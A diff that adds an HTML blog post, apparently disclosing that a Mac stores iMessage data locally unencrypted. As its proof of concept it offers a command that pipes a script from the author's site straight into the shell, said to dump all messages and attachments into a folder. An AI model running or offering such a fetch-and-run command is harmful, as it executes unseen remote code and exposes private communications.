@@ -1,0 +1,47 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="/fontawesome/css/all.css" rel="stylesheet"> <!--load all styles -->
+    <link href="/stylesheets/all.css" rel="stylesheet" media="screen" />
+    <link href="/stylesheets/print.css" rel="stylesheet" media="print" />
+
+    <title>Steal all of your iMessages</title>
+    <script src="/javascripts/site.js"></script>
+  </head>
+  <body>
+    <main>
+      <p>Apple touts the <a href="https://support.apple.com/en-us/HT207006">security of its
+iMessage service</a>.
+It turns out, locally, the data is sitting unencrypted ready for taking.</p>
+
+<p>As a proof of concept I made a small utility to read all the iMessage data on
+a computer and turn into a web archive. One folder with all of your attachments
+and messages ready to peruse. Better yet, I made it easy to run on any Mac. Just
+open up a terminal and run:</p>
+
+<div class="boom-script">
+  <pre><code>curl -s www.jpoz.net/mz | sh</code></pre>
+</div>
+
+<p>Go to the user's home folder and you'll find a <code>messages</code> directory.</p>
+
+<p>Enjoy! Don't do bad things with it.</p>
+
+    </main>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-K7ZEMM6EGS"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-K7ZEMM6EGS');
+    </script>
+  </body>
+</html>
